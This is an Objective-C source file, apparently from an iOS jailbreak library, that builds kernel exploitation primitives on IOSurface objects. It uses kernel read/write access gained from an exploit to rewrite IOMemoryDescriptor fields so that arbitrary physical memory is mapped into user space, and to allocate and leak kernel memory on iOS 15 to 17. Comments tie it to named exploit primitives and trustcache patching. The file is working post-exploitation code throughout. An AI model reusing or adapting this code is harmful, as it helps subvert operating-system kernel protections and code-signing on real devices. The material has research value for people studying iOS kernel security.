#import "info.h"
#import "primitives.h"
#import "translation.h"
#import "kernel.h"
#import "util.h"
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <mach-o/dyld.h>

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
        uint64_t surfaceClientsArray = kread_ptr(rootUserClient + 0x118);
        return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
        return kread_ptr(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
        if (koffsetof(IOMachPort, object)) {
                if (gPrimitives.krwMinSafeReadSize > 0x8) {
                        uint32_t zoneSize = koffsetof(IOMachPort, object) + 0x8;
                        uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;
                        uint8_t buf[gPrimitives.krwMinSafeReadSize];
                        kreadbuf(surfaceSendRight + readOffset, buf, gPrimitives.krwMinSafeReadSize);
                        return UNSIGN_PTR(*(uint64_t *)(&buf[gPrimitives.krwMinSafeReadSize - 0x8]));
                }
                return kread_ptr(surfaceSendRight + koffsetof(IOMachPort, object));
        }
        return kread_ptr(surfaceSendRight + 0x18);
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
        return kread_ptr(surface + (koffsetof(IOSurface, ranges) ?: 0x3e0));
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
        kwrite64(surface + (koffsetof(IOSurface, ranges) ?: 0x3e0), ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
        return kread_ptr(surface + (koffsetof(IOSurface, memoryDescriptor) ?: 0x38));
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
        return kread_ptr(memoryDescriptor + 0x60);
}

int IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
{
        return kwrite64(memoryDescriptor + 0x60, ranges);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
        return kread64(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
        kwrite64(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
        kwrite8(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
        return kread32(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
        kwrite8(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
        kwrite64(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
        return kread_ptr(surface + (koffsetof(IOSurface, rangeCount) ?: 0x3e8));
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
        kwrite32(surface + (koffsetof(IOSurface, rangeCount) ?: 0x3e8), rangeCount);
}

uint64_t IOSurface_port_getSendRight(mach_port_t surfaceMachPort)
{
        uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
        if (koffsetof(IOMachPort, object)) {
                if (gPrimitives.krwMinSafeReadSize > 0x8) {
                        uint32_t zoneSize = koffsetof(IOMachPort, object) + 0x8;
                        uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;
                        uint8_t buf[gPrimitives.krwMinSafeReadSize];
                        kreadbuf(surfaceSendRight + readOffset, buf, gPrimitives.krwMinSafeReadSize);
                        surfaceSendRight = UNSIGN_PTR(*(uint64_t *)(&buf[gPrimitives.krwMinSafeReadSize - 0x8]));
                }
                else {
                        surfaceSendRight = kread_ptr(surfaceSendRight + koffsetof(IOMachPort, object));
                }
        }
        return surfaceSendRight;
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic, uint32_t cacheMode)
{
        IOSurfaceRef surfaceRef = nil;
        if (cacheMode != 0) {
                surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
                        (__bridge NSString *)kIOSurfaceWidth : @120,
                        (__bridge NSString *)kIOSurfaceHeight : @120,
                        (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
                        (__bridge NSString *)kIOSurfaceCacheMode : @(cacheMode),
                });
        }
        else {
                surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
                        (__bridge NSString *)kIOSurfaceWidth : @120,
                        (__bridge NSString *)kIOSurfaceHeight : @120,
                        (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
                });
        }
        if (!surfaceRef) return MACH_PORT_NULL;

        void *baseAddress = IOSurfaceGetBaseAddress(surfaceRef);
        mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
        if (!MACH_PORT_VALID(port) || !baseAddress) {
                CFRelease(surfaceRef);
                return MACH_PORT_NULL;
        }
        *((uint64_t *)baseAddress) = magic;
        IOSurfaceDecrementUseCount(surfaceRef);
        CFRelease(surfaceRef);
        return port;
}

struct IOSurface_toCleanup {
        uint64_t descriptor;
        uint64_t origRanges;
        uint64_t *fakeRangesUA;
};

static struct IOSurface_toCleanup *cleanups = NULL;
static unsigned cleanupsCount = 0;

int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
{
        if (!uaddr || size == 0) return -1;
        mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
        if (!MACH_PORT_VALID(surfaceMachPort)) return -1;

        uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
        uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
        uint64_t desc = IOSurface_get_memoryDescriptor(surface);
        uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);

        if (gPrimitives.krwMinSafeReadSize > 0x10) {
                // DarkSword/ClearSword primitives cannot safely perform the 8-byte
                // writes required by an IOMemoryDescriptor ranges structure. Place a
                // kernel-addressable copy in user memory and restore the original
                // structure after physrw has replaced the exploit primitive.
                uint64_t *fakeRanges = malloc(2 * sizeof(uint64_t));
                if (!fakeRanges) return -1;
                fakeRanges[0] = pa;
                fakeRanges[1] = size;
                uint64_t fakeRangesKA = phystokv(vtophys(ttep_self(), (uint64_t)fakeRanges));
                if (!fakeRangesKA) {
                        free(fakeRanges);
                        return -1;
                }

                // Reserve the cleanup record before changing the descriptor. This avoids
                // leaving a live fake pointer behind if realloc fails.
                struct IOSurface_toCleanup *newCleanups = realloc(cleanups, (cleanupsCount + 1) * sizeof(*cleanups));
                if (!newCleanups) {
                        free(fakeRanges);
                        return -1;
                }
                cleanups = newCleanups;
                if (IOMemoryDescriptor_set_ranges(desc, fakeRangesKA) != 0) {
                        free(fakeRanges);
                        return -1;
                }
                cleanups[cleanupsCount].descriptor = desc;
                cleanups[cleanupsCount].origRanges = ranges;
                cleanups[cleanupsCount].fakeRangesUA = fakeRanges;
                cleanupsCount++;
        }
        else {
                if (kwrite64(ranges, pa) != 0 || kwrite64(ranges + 8, size) != 0) return -1;
        }
        IOMemoryDescriptor_set_size(desc, size);
        if (kwrite64(desc + 0x70, 0) != 0 ||
                kwrite64(desc + 0x18, 0) != 0 ||
                kwrite64(desc + 0x90, 0) != 0) return -1;
        IOMemoryDescriptor_set_wired(desc, true);
        uint32_t flags = IOMemoryDescriptor_get_flags(desc);
        IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);
        IOMemoryDescriptor_set_memRef(desc, 0);
        IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
        if (!mappedSurfaceRef) return -1;
        *uaddr = IOSurfaceGetBaseAddress(mappedSurfaceRef);
        if (!*uaddr) {
                CFRelease(mappedSurfaceRef);
                return -1;
        }

        // iOS 17+ already returns a usable IOSurface mapping. Remapping the
        // physical IOSurface range through vm_remap is unnecessary there and can
        // trigger zone-bound panics in newer XNU versions. Keep the legacy remap
        // only for iOS 15/16, matching RootHide upstream 90c74fc.
        if (@available(iOS 17.0, *)) {
                // No remap on iOS 17+.
        }
        else {
                vm_prot_t cur_prot, max_prot;
                kern_return_t kr = vm_remap(mach_task_self(), (vm_address_t *)uaddr, size, 0, VM_FLAGS_ANYWHERE, mach_task_self(), (vm_address_t)*uaddr, FALSE, &cur_prot, &max_prot, VM_INHERIT_NONE);
                if (kr != KERN_SUCCESS) {
                        CFRelease(mappedSurfaceRef);
                        return -1;
                }
        }

        CFRelease(mappedSurfaceRef);

        return 0;
}

int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr)
{
        return IOSurface_map_withCacheMode(pa, size, uaddr, 0);
}

void IOSurface_map_cleanup(void)
{
        if (cleanupsCount == 0) return;

        // In the fake-ranges path, the original range structure was never changed.
        // Only restore the descriptor's pointer; writing pa/size into origRanges
        // would corrupt the IOSurface's real backing descriptor. Use the post-exploit
        // primitive and retain failed records for a later retry.
        unsigned pending = 0;
        for (unsigned i = 0; i < cleanupsCount; i++) {
                uint64_t desc = cleanups[i].descriptor;
                uint64_t origRanges = cleanups[i].origRanges;
                uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;
                if (IOMemoryDescriptor_set_ranges(desc, origRanges) == 0) {
                        free(fakeRangesUA);
                } else {
                        if (pending != i) cleanups[pending] = cleanups[i];
                        pending++;
                }
        }

        cleanupsCount = pending;
        if (cleanupsCount == 0) {
                free(cleanups);
                cleanups = NULL;
        }
}

static CFNumberRef CFNUM64(uint64_t value)
{
        return CFNumberCreate(NULL, kCFNumberSInt64Type, (void *)&value);
}

static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size)
{
        uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);
        static vm_size_t dummyPageSize = 0x4000;
        static vm_address_t dummyPage = 0;
        if (dummyPage == 0) {
                if (vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return MACH_PORT_NULL;
        }

        uint64_t *userspaceRanges = malloc(rangesAlignedSize);
        if (!userspaceRanges) return MACH_PORT_NULL;
        for (uint64_t i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
                userspaceRanges[i] = dummyPage;
                userspaceRanges[i + 1] = dummyPageSize;
        }

        CFDataRef userspaceRangesData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)userspaceRanges, rangesAlignedSize);
        free(userspaceRanges);
        if (!userspaceRangesData) return MACH_PORT_NULL;

        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
        CFNumberRef dummyPageSizeNum = CFNUM64(dummyPageSize);
        if (!dict || !dummyPageSizeNum) {
                if (dummyPageSizeNum) CFRelease(dummyPageSizeNum);
                if (dict) CFRelease(dict);
                CFRelease(userspaceRangesData);
                return MACH_PORT_NULL;
        }
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), dummyPageSizeNum);
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), userspaceRangesData);

        IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
        mach_port_t port = surfaceRef ? IOSurfaceCreateMachPort(surfaceRef) : MACH_PORT_NULL;
        if (surfaceRef) IOSurfaceDecrementUseCount(surfaceRef);
        CFRelease(userspaceRangesData);
        CFRelease(dummyPageSizeNum);
        CFRelease(dict);
        return port;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak)
{
        if (size == 0 || size > 0x10000) return 0;
        while (true) {
                mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(size);
                if (surfaceMachPort == MACH_PORT_NULL) return 0;

                uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
                uint64_t surface = surfaceSendRight ? IOSurfaceSendRight_get_surface(surfaceSendRight) : 0;
                uint64_t va = surface ? IOSurface_get_ranges(surface) : 0;
                uint64_t vaSize = surface ? IOSurface_get_rangeCount(surface) * 0x10 : 0;
                if (va == 0 || vaSize < size) {
                        mach_port_deallocate(mach_task_self(), surfaceMachPort);
                        continue;
                }

                if (leak) {
                        IOSurface_set_ranges(surface, 0);
                        IOSurface_set_rangeCount(surface, 0);
                }
                return va;
        }
}

static mach_port_t IOSurface_kalloc_getSurfacePort_15(uint64_t size)
{
        uint64_t allocSize = 0x10;
        uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
        if (!addressRangesBuf) return MACH_PORT_NULL;
        memset(addressRangesBuf, 0, size);
        addressRangesBuf[0] = (uint64_t)malloc(allocSize);
        addressRangesBuf[1] = allocSize;
        NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
        free(addressRangesBuf);
        if (!addressRanges) return MACH_PORT_NULL;

        IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
                @"IOSurfaceAllocSize" : @(allocSize),
                @"IOSurfaceAddressRanges" : addressRanges,
        });
        mach_port_t port = surfaceRef ? IOSurfaceCreateMachPort(surfaceRef) : MACH_PORT_NULL;
        if (surfaceRef) IOSurfaceDecrementUseCount(surfaceRef);
        return port;
}

uint64_t IOSurface_kalloc_15(uint64_t size, bool leak)
{
        while (true) {
                uint64_t allocSize = max(size, 0x10000);
                mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_15(allocSize);
                if (surfaceMachPort == MACH_PORT_NULL) return 0;

                uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
                uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
                uint64_t va = IOSurface_get_ranges(surface);
                if (kvtophys(va + allocSize) != 0) {
                        mach_port_deallocate(mach_task_self(), surfaceMachPort);
                        continue;
                }
                if (va == 0) continue;
                if (leak) {
                        IOSurface_set_ranges(surface, 0);
                        IOSurface_set_rangeCount(surface, 0);
                }
                return va + (allocSize - size);
        }
}

int IOSurface_kalloc_global(uint64_t *addr, uint64_t size)
{
        uint64_t alloc = 0;
        if (@available(iOS 16.0, *)) alloc = IOSurface_kalloc_16up(size, true);
        else alloc = IOSurface_kalloc_15(size, true);
        if (alloc != 0) {
                *addr = alloc;
                return 0;
        }
        return -1;
}

int IOSurface_kalloc_local(uint64_t *addr, uint64_t size)
{
        uint64_t alloc = 0;
        if (@available(iOS 16.0, *)) alloc = IOSurface_kalloc_16up(size, false);
        else alloc = IOSurface_kalloc_15(size, false);
        if (alloc != 0) {
                *addr = alloc;
                return 0;
        }
        return -1;
}

// On iOS 17+, IOSurface kernel allocations cannot be individually freed
// via the IOSurface interface. We provide a stub that returns success to
// prevent error propagation in trustcache and other kfree callers.
// The memory is effectively leaked but will be reclaimed on userspace reboot.
static int IOSurface_kfree_global_stub(uint64_t addr, uint64_t size)
{
        // IOSurface-backed kalloc cannot free individual allocations.
        // Return 0 to avoid callers treating -1 as an error and aborting.
        // The small leak is acceptable during the jailbreak process
        // (reclaimed on userspace reboot).
        (void)addr;
        (void)size;
        return 0;
}

void libjailbreak_IOSurface_primitives_init(void)
{
        IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
                (__bridge NSString *)kIOSurfaceWidth : @120,
                (__bridge NSString *)kIOSurfaceHeight : @120,
                (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
        });
        if (!surfaceRef) {
                char execPath[PATH_MAX];
                uint32_t execPathSize = PATH_MAX;
                _NSGetExecutablePath(execPath, &execPathSize);
                printf("Failed to initialize IOSurface primitives, add \\\"IOSurfaceRootUserClient\\\" to the \\\"com.apple.security.exception.iokit-user-client-class\\\" dictionary of the entitlements from \\\"%s\\\" to fix this. Due to this, the kalloc, kmap and kcall primitives will not work.\\n", execPath);
                return;
        }
                CFRelease(surfaceRef);
        gPrimitives.kmap = IOSurface_map;
        // Keep the legacy iOS 16 path: DOJailbreaker will initialize the
        // page-table allocator there. Titan is the only consumer of the
        // IOSurface 16+ global/local allocators, and it is restricted to iOS 17.
        if (@available(iOS 17.0, *)) {
                gPrimitives.kalloc_global = IOSurface_kalloc_global;
                gPrimitives.kalloc_local  = IOSurface_kalloc_local;
                gPrimitives.kfree_global  = IOSurface_kfree_global_stub;
        }
}